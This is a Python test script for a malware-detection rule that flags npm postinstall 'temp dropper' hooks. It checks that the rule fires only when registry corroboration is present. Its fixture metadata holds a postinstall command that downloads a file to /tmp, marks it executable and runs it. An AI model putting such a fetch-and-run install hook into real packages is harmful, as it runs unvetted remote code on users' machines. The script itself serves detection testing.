#!/usr/bin/env python3
"""Do not count the same temp execution as its own corroboration."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[2]
CLEAVE = os.environ.get('CLEAVE', str(ROOT.parent / 'cleave/target/release/cleave'))
RULE = 'objectives/execution/payload/file-exec/command/chmod::postinstall-temp-dropper'
with tempfile.TemporaryDirectory(prefix='registry-temp-') as tmp:
    for name, extra, expected in (
        ('uncorroborated', {}, 'NOT MATCHED'),
        ('registry', {'dist': {'tarball': 'https://registry.npmjs.org/a/-/a.tgz'}}, 'MATCHED'),
    ):
        directory = Path(tmp) / name
        directory.mkdir()
        path = directory / 'metadata.json'
        metadata = {'dist-tags': {'latest': '1.0.0'}, 'scripts': {'postinstall': 'curl https://example.org/a -o /tmp/a && chmod +x /tmp/a && /tmp/a &'}}
        metadata.update(extra)
        path.write_text(json.dumps(metadata))
        trace = subprocess.run([CLEAVE, '--traits-dir', str(ROOT), 'test-rules', '--rules', RULE, str(path)], text=True, capture_output=True, check=True).stdout
        assert f'{expected} {RULE}' in trace, trace
print('Registry temp execution: independent corroboration required')
